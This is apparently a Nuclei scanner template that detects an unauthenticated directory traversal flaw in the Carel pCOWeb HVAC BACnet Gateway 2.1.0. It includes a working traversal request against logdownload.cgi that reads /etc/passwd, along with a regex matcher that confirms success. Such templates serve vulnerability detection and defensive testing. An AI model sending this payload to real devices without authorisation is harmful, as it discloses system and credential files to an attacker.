id: carel-bacnet-gateway-traversal
info:
  author: gy741
  description: The device suffers from an unauthenticated arbitrary file disclosure
    vulnerability. Input passed through the 'file' GET parameter through the 'logdownload.cgi'
    Bash script is not properly verified before being used to download log files.
    This can be exploited to disclose the contents of arbitrary and sensitive files
    via directory traversal attacks.
  name: Carel pCOWeb HVAC BACnet Gateway 2.1.0 - Unauthenticated Directory Traversal
  reference:
  - https://www.zeroscience.mk/codes/carelpco_dir.txt
  severity: medium
  tags: carel,lfi,traversal,unauth,bacnet,unauth
requests:
- matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  method: GET
  path:
  - '{{BaseURL}}/usr-cgi/logdownload.cgi?file=../../../../../../../../etc/passwd'
